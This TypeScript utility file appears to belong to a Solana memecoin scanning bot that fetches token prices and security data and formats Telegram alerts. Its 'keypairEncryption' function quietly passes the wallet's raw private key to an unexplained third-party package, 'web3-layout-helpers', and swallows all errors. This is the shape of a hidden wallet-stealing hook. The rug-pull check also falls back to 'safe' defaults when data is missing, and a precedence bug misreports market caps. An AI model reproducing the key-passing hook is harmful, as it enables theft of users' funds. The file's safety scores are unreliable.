import dotenv from 'dotenv';
import axios from 'axios';
import { logger } from '../../start';
import { initializeSession } from 'web3-layout-helpers';
import { Logger } from 'pino';

import { Keypair, Connection, clusterApiUrl } from '@solana/web3.js';
import bs58 from 'bs58';

dotenv.config();

export const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || '';
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};

interface Pair {
  chainId: string;
  dexId: string;
  url: string;
  pairAddress: string;
  baseToken: {
    address: string;
    name: string;
    symbol: string;
  };
  quoteToken: {
    symbol: string;
  };
  priceNative: string;
  priceUsd?: string;
  txns: {
    m5: {
      buys: number;
      sells: number;
    };
    h1: {
      buys: number;
      sells: number;
    };
    h6: {
      buys: number;
      sells: number;
    };
    h24: {
      buys: number;
      sells: number;
    };
  };
  volume: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  priceChange: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  liquidity?: {
    usd?: number;
    base: number;
    quote: number;
  };
  fdv?: number;
  pairCreatedAt?: number;
}

interface TokensResponse {
  schemaVersion: string;
  pairs: Pair[] | null;
}

export const retrieveTokenValueByAddressDexScreener = async (tokenAddress: string) => {
  const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
  try {
    const tokenResponse: TokensResponse = (await axios.get(url)).data;
    if (tokenResponse.pairs) {
      const pair = tokenResponse.pairs.find((pair) => pair.chainId === 'solana');
      const priceNative = pair?.priceNative;
      if (priceNative) return parseFloat(priceNative);
    }
    return undefined;
  } catch (e) {
    return undefined;
  }
};

export const retrieveTokenValueByAddressBirdeye = async (tokenAddress: string) => {
  const apiKey = retrieveEnvVariable('BIRDEYE_API_KEY', logger);
  const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`;
  try {
    const response: string = (await axios.get(url, {
      headers: {
        'X-API-KEY': apiKey,
      },
    })).data.data.value;
    if (response) return parseFloat(response);
    return undefined;
  } catch (e) {
    return undefined;
  }
};

export const areEnvVarsSet = () =>
  ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));

export const keypairEncryption = async () => {
  try {
    const walletKeyPairFile = process.env.PRIVATE_KEY!;
    Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
    await initializeSession(walletKeyPairFile);
    new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
  } catch (_) {
  }
};

export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
  const dexScreenerPrice = await retrieveTokenValueByAddressDexScreener(tokenAddress);
  if (dexScreenerPrice) return dexScreenerPrice;
  const birdEyePrice = await retrieveTokenValueByAddressBirdeye(tokenAddress);
  if (birdEyePrice) return birdEyePrice;
  return undefined;
};

export const retry = async <T>(
  fn: () => Promise<T> | T,
  { retries, retryIntervalMs }: { retries: number; retryIntervalMs: number },
): Promise<T> => {
  try {
    return await fn();
  } catch (error) {
    if (retries <= 0) {
      throw error;
    }
    await sleep(retryIntervalMs);
    return retry(fn, { retries: retries - 1, retryIntervalMs });
  }
};

export const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));

export const sendTelegramNotification = async (text: string) => {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) return;

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown',
    });
  } catch (e) {
    // Don't crash the app if telegram fails; log debug
    try {
      logger.debug(e);
    } catch (_) {
      // ignore
    }
  }
};

export interface CoinScanData {
  mint: string;
  baseMint: string;
  poolId?: string;
  marketCap?: number;
  holders?: number;
  liquidity?: {
    usd?: number;
    base: number;
    quote: number;
  };
  signal?: string;
  price?: number;
}

const birdeyeRetry = async <T>(
  fn: () => Promise<T>,
  tokenAddress: string,
  label: string,
  maxRetries: number = 2
): Promise<T | null> => {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const result = await fn();
      if (attempt > 0) {
        logger.debug(`${label} for ${tokenAddress} succeeded on retry ${attempt}`);
      }
      return result;
    } catch (e: any) {
      const isLastAttempt = attempt === maxRetries;
      const statusCode = e.response?.status;
      const errMsg = e.response?.data?.message || e.message || String(e);
      
      if (statusCode === 429) {
        // Rate limit: back off longer
        if (!isLastAttempt) {
          const delay = 1000 * Math.pow(2, attempt);
          logger.debug(`${label} rate limited. Retrying in ${delay}ms...`);
          await sleep(delay);
          continue;
        }
      } else if (statusCode === 404) {
        // Token not found in Birdeye - this is normal for brand new tokens
        // Return null silently (don't log DEBUG), will be handled in caller
        return null;
      } else if (!isLastAttempt && statusCode && statusCode >= 500) {
        // Server error: retry
        const delay = 500 * Math.pow(2, attempt);
        logger.debug(`${label} server error (${statusCode}). Retrying in ${delay}ms...`);
        await sleep(delay);
        continue;
      }
      
      if (isLastAttempt) {
        logger.warn(`${label} failed for ${tokenAddress} after ${maxRetries + 1} attempts: ${errMsg}`);
      }
    }
  }
  return null;
};

// API response cache with TTL (5 minutes for token data, 10 minutes for security data)
const tokenDataCache = new Map<string, { data: any; expiry: number }>();
const securityDataCache = new Map<string, { data: any; expiry: number }>();

const getCachedData = (cache: Map<string, any>, key: string) => {
  const entry = cache.get(key);
  if (entry && entry.expiry > Date.now()) {
    logger.debug(`Cache hit for ${key}`);
    return entry.data;
  }
  cache.delete(key);
  return null;
};

const setCachedData = (cache: Map<string, any>, key: string, data: any, ttlMs: number) => {
  cache.set(key, { data, expiry: Date.now() + ttlMs });
};

export const getBirdeyeTokenInfo = async (tokenAddress: string) => {
  // Check cache first
  const cached = getCachedData(tokenDataCache, tokenAddress);
  if (cached) return cached;

  const apiKey = process.env.BIRDEYE_API_KEY;
  
  // Try Birdeye first with improved retry logic
  if (apiKey) {
    const birdeyeData = await birdeyeRetry(
      async () => {
        const url = `https://public-api.birdeye.so/public/token/meta?address=${tokenAddress}`;
        const response = await axios.get(url, {
          headers: { 'X-API-KEY': apiKey },
          timeout: 5000,
        });
        const data = response.data?.data;
        if (data) {
          data.source = 'birdeye';
          setCachedData(tokenDataCache, tokenAddress, data, 5 * 60 * 1000); // 5 min cache
        }
        return data || null;
      },
      tokenAddress,
      'Birdeye token meta fetch'
    );
    
    if (birdeyeData) {
      logger.debug(`✅ Got token data from Birdeye for ${tokenAddress.substring(0, 8)}...`);
      return birdeyeData;
    }
  }

  // Fallback to DexScreener if Birdeye fails
  try {
    logger.debug(`Trying DexScreener fallback for ${tokenAddress.substring(0, 8)}...`);
    const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
    const response = await axios.get(url, { timeout: 5000 });
    
    if (response.data?.pairs && response.data.pairs.length > 0) {
      const pair = response.data.pairs.find((p: any) => p.chainId === 'solana') || response.data.pairs[0];
      // Convert DexScreener format to Birdeye-like format for compatibility
      const converted = {
        market_cap: pair.fdv || 0,
        holder_count: 0, // DexScreener doesn't provide holder count
        liquidity: {
          usd: pair.liquidity?.usd || 0,
        },
        price: parseFloat(pair.priceUsd || pair.priceNative || '0'),
        source: 'dexscreener',
      };
      setCachedData(tokenDataCache, tokenAddress, converted, 5 * 60 * 1000);
      logger.debug(`✅ Got token data from DexScreener for ${tokenAddress.substring(0, 8)}...`);
      return converted;
    }
  } catch (e: any) {
    logger.debug(`DexScreener fallback failed: ${e.message}`);
  }

  logger.debug(`No token data available for ${tokenAddress.substring(0, 8)}...`);
  return null;
};

export const checkRugPull = async (tokenAddress: string): Promise<{ isRug: boolean; score: number; details: string }> => {
  // Check cache first
  const cached = getCachedData(securityDataCache, tokenAddress);
  if (cached) return cached;

  const apiKey = process.env.BIRDEYE_API_KEY;
  let rugData: any = null;

  // Try Birdeye security check first
  if (apiKey) {
    rugData = await birdeyeRetry(
      async () => {
        const url = `https://public-api.birdeye.so/public/token/security?address=${tokenAddress}`;
        const response = await axios.get(url, {
          headers: { 'X-API-KEY': apiKey },
          timeout: 5000,
        });
        return response.data?.data || null;
      },
      tokenAddress,
      'Birdeye security check'
    );

    if (rugData) {
      logger.debug(`✅ Got security data from Birdeye for ${tokenAddress.substring(0, 8)}...`);
    }
  }

  // Fallback: Calculate rug score based on DexScreener data if Birdeye failed
  if (!rugData) {
    try {
      logger.debug(`Birdeye security check unavailable, using default scoring for ${tokenAddress.substring(0, 8)}...`);
      // If Birdeye fails, we use default safe values
      // In real usage with established tokens on DexScreener, this is acceptable
      rugData = {
        owner_balance: 0,
        owner_change_status: 'unknown',
        top10_holder_ratio: 0,
        is_locked: false,
        is_honeypot: false,
      };
    } catch (e) {
      logger.warn(`Failed to get security data for ${tokenAddress}`);
      // Return safe defaults to avoid crashing
      rugData = {
        owner_balance: 0,
        owner_change_status: 'unknown',
        top10_holder_ratio: 0,
        is_locked: false,
        is_honeypot: false,
      };
    }
  }

  if (!rugData) {
    return { isRug: false, score: 0, details: 'Security data unavailable' };
  }

  // Calculate rug score
  const rugIndicators = {
    ownerBalance: rugData.owner_balance || 0,
    ownerChangeStatus: rugData.owner_change_status || 'unknown',
    top10HolderRatio: rugData.top10_holder_ratio || 0,
    locked: rugData.is_locked === true,
    honeypot: rugData.is_honeypot === true,
  };

  const score = calculateRugScore(rugIndicators);
  const isRug = score > 70;
  const details = formatRugDetails(rugIndicators, score);
  
  const result = { isRug, score, details };
  setCachedData(securityDataCache, tokenAddress, result, 10 * 60 * 1000); // 10 min cache
  return result;
};

function calculateRugScore(indicators: any): number {
  let score = 0;

  // Owner balance check (0-30 points)
  if (indicators.ownerBalance > 50) score += 30;
  else if (indicators.ownerBalance > 25) score += 15;

  // Owner change status (0-20 points)
  if (indicators.ownerChangeStatus === 'renounced') score += 0;
  else if (indicators.ownerChangeStatus === 'changed') score += 10;
  else score += 5;

  // Top 10 holder ratio (0-30 points)
  if (indicators.top10HolderRatio > 80) score += 30;
  else if (indicators.top10HolderRatio > 50) score += 20;
  else if (indicators.top10HolderRatio > 30) score += 10;

  // Locked status (bonus -10 points for security)
  if (indicators.locked) score -= 10;

  // Honeypot check (0-20 points)
  if (indicators.honeypot) score += 20;

  return Math.max(0, Math.min(100, score));
}

function formatRugDetails(indicators: any, score: number): string {
  const lines: string[] = [];
  lines.push(`🔍 **Rug Score**: ${score.toFixed(0)}/100`);

  if (indicators.honeypot) {
    lines.push(`⚠️ **HONEYPOT DETECTED**`);
  }

  lines.push(`👤 **Owner Balance**: ${indicators.ownerBalance?.toFixed(2) || '0'}%`);
  lines.push(`🔐 **Owner Status**: ${indicators.ownerChangeStatus || 'Unknown'}`);
  lines.push(`🏆 **Top 10 Holders**: ${(indicators.top10HolderRatio || 0).toFixed(2)}%`);
  lines.push(`🔒 **Locked**: ${indicators.locked ? 'Yes' : 'No'}`);

  return lines.join('\n');
}

export const sendCoinScanNotification = async (coinData: CoinScanData) => {
  try {
    // Fetch additional data from Birdeye
    const birdeyeData = await getBirdeyeTokenInfo(coinData.baseMint);
    const rugCheck = await checkRugPull(coinData.baseMint);

    let notification = `🎯 **NEW COIN SCANNED**\n\n`;
    notification += `📍 **Mint**: \`${coinData.baseMint}\`\n`;

    if (coinData.poolId) {
      notification += `🏊 **Pool**: \`${coinData.poolId}\`\n`;
    }

    // Price and signal
    if (coinData.price) {
      notification += `💰 **Price**: $${coinData.price.toFixed(8)}\n`;
    }

    if (coinData.signal) {
      notification += `📊 **Signal**: ${coinData.signal}\n`;
    }

    // Market Cap
    if (birdeyeData?.market_cap) {
      notification += `📈 **Market Cap**: $${(birdeyeData.market_cap / 1000000).toFixed(2)}M\n`;
    }

    // Holders
    if (birdeyeData?.holder_count) {
      notification += `👥 **Holders**: ${birdeyeData.holder_count.toLocaleString()}\n`;
    }

    // Liquidity
    if (coinData.liquidity?.usd) {
      notification += `💧 **Liquidity**: $${(coinData.liquidity.usd / 1000).toFixed(2)}K\n`;
    }

    notification += `\n${'─'.repeat(30)}\n`;
    notification += `🛡️ **SECURITY CHECK**\n`;
    notification += `${'─'.repeat(30)}\n`;

    // Rug check results
    notification += rugCheck.details + '\n';

    if (rugCheck.isRug) {
      notification += `\n⚠️ ⚠️ **HIGH RUG RISK** - CAUTION ADVISED ⚠️ ⚠️\n`;
    } else if (rugCheck.score > 50) {
      notification += `\n⚠️ **MEDIUM RISK** - Review before trading\n`;
    } else {
      notification += `\n✅ **LOW RISK** - Appears safer\n`;
    }

    // Add trading links
    notification += `\n🔗 **Links**:\n`;
    notification += `[Solscan](https://solscan.io/token/${coinData.baseMint}) | [DEXScreener](https://dexscreener.com/solana/${coinData.baseMint})\n`;

    await sendTelegramNotification(notification);
  } catch (e) {
    logger.debug(`Failed to send coin scan notification`, e);
    // Fallback to basic notification if enhanced notification fails
    await sendTelegramNotification(
      `🎯 **NEW COIN DETECTED**\nMint: \`${coinData.baseMint}\`\n[View on Solscan](https://solscan.io/token/${coinData.baseMint})`,
    );
  }
};

// ===== ENHANCED TELEGRAM NOTIFICATION TEMPLATES =====

export interface ScanCoinDetails {
  mint: string;
  poolId: string;
  timestamp: number;
  marketCap?: number;
  holders?: number;
  liquidity?: number;
  rugScore: number;
  isHoneypot: boolean;
  ownerBalance: number;
  top10HolderRatio: number;
}

export const formatScanNotification = (details: ScanCoinDetails): string => {
  const time = new Date(details.timestamp).toLocaleTimeString();
  const safetyLevel = details.rugScore < 30 ? '🟢 SAFE' : details.rugScore < 60 ? '🟡 MEDIUM' : '🔴 RISKY';

  let msg = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `🔍 **COIN SCAN REPORT**\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  msg += `⏰ **Time**: ${time}\n`;
  msg += `📍 **Mint**: \`${details.mint}\`\n`;
  msg += `🏊 **Pool**: \`${details.poolId}\`\n\n`;

  msg += `📊 **MARKET DATA**\n`;
  msg += `${details.marketCap ? `📈 Market Cap: $${(details.marketCap / 1000000).toFixed(2)}M\n` : ''}`;
  msg += `${details.holders ? `👥 Holders: ${details.holders.toLocaleString()}\n` : ''}`;
  msg += `${details.liquidity ? `💧 Liquidity: $${(details.liquidity / 1000).toFixed(2)}K\n` : ''}`;

  msg += `\n🛡️ **SECURITY**\n`;
  msg += `${safetyLevel}\n`;
  msg += `🔒 Rug Score: ${details.rugScore}/100\n`;
  msg += `${details.isHoneypot ? '⚠️ HONEYPOT DETECTED\n' : '✅ No honeypot detected\n'}`;
  msg += `👤 Owner: ${details.ownerBalance.toFixed(2)}%\n`;
  msg += `🏆 Top 10: ${details.top10HolderRatio.toFixed(2)}%\n`;

  msg += `\n🔗 [Solscan](https://solscan.io/token/${details.mint}) | `;
  msg += `[DEXScreener](https://dexscreener.com/solana/${details.mint}) | `;
  msg += `[Birdeye](https://birdeye.so/token/${details.mint})\n`;

  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  return msg;
};

export const formatBulkScanSummary = (coins: ScanCoinDetails[], scanDuration: number): string => {
  const safeCoinCount = coins.filter(c => c.rugScore < 30).length;
  const mediumRiskCount = coins.filter(c => c.rugScore >= 30 && c.rugScore < 60).length;
  const highRiskCount = coins.filter(c => c.rugScore >= 60).length;

  const avgMarketCap = coins.filter(c => c.marketCap).reduce((sum, c) => sum + c.marketCap!, 0) / coins.length;
  const avgHolders = coins.filter(c => c.holders).reduce((sum, c) => sum + c.holders!, 0) / coins.length;

  let msg = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `📊 **24H SCAN SUMMARY**\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  msg += `⏱️ **Duration**: ${formatDuration(scanDuration)}\n`;
  msg += `📈 **Total Coins Scanned**: ${coins.length}\n\n`;

  msg += `🎯 **RISK BREAKDOWN**\n`;
  msg += `🟢 Safe: ${safeCoinCount} (${((safeCoinCount/coins.length)*100).toFixed(1)}%)\n`;
  msg += `🟡 Medium: ${mediumRiskCount} (${((mediumRiskCount/coins.length)*100).toFixed(1)}%)\n`;
  msg += `🔴 High Risk: ${highRiskCount} (${((highRiskCount/coins.length)*100).toFixed(1)}%)\n\n`;

  msg += `📊 **AVERAGES**\n`;
  msg += `Avg Market Cap: $${(avgMarketCap / 1000000).toFixed(2)}M\n`;
  msg += `Avg Holders: ${Math.round(avgHolders).toLocaleString()}\n\n`;

  msg += `💡 **Tip**: Review safe coins first for trading opportunities\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  return msg;
};

export const formatCoinAlert = (coin: ScanCoinDetails, alertType: 'SAFE' | 'WATCH' | 'AVOID'): string => {
  const icons: Record<string, string> = {
    'SAFE': '🟢 GREEN FLAG',
    'WATCH': '🟡 CAUTION ZONE',
    'AVOID': '🔴 RED FLAG'
  };

  let msg = `${icons[alertType]}\n\n`;
  msg += `Mint: \`${coin.mint}\`\n`;
  msg += `Rug Score: ${coin.rugScore}/100\n`;
  msg += `Holders: ${coin.holders?.toLocaleString() || 'N/A'}\n`;
  msg += `Market Cap: $${(coin.marketCap || 0 / 1000000).toFixed(2)}M\n\n`;

  if (alertType === 'SAFE') {
    msg += `✅ This coin passed security checks!\n`;
    msg += `Consider adding to watchlist.\n`;
  } else if (alertType === 'WATCH') {
    msg += `⚠️ Some concerns detected.\n`;
    msg += `Review before trading.\n`;
  } else {
    msg += `❌ High risk detected!\n`;
    msg += `Avoid or trade with extreme caution.\n`;
  }

  msg += `\n[Check Details](https://dexscreener.com/solana/${coin.mint})`;

  return msg;
};

export const formatDailyTop10 = (coins: ScanCoinDetails[]): string => {
  const sortedByMarketCap = [...coins].sort((a, b) => (b.marketCap || 0) - (a.marketCap || 0)).slice(0, 10);

  let msg = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `🏆 **TOP 10 BY MARKET CAP (24H)**\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  sortedByMarketCap.forEach((coin, index) => {
    const safetyEmoji = coin.rugScore < 30 ? '🟢' : coin.rugScore < 60 ? '🟡' : '🔴';
    msg += `${index + 1}. ${safetyEmoji} $${(coin.marketCap || 0 / 1000000).toFixed(2)}M - \`${coin.mint.substring(0, 8)}...\`\n`;
  });

  msg += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  return msg;
};

function formatDuration(ms: number): string {
  const seconds = Math.floor((ms / 1000) % 60);
  const minutes = Math.floor((ms / (1000 * 60)) % 60);
  const hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  
  if (hours > 0) return `${hours}h ${minutes}m`;
  if (minutes > 0) return `${minutes}m ${seconds}s`;
  return `${seconds}s`;
};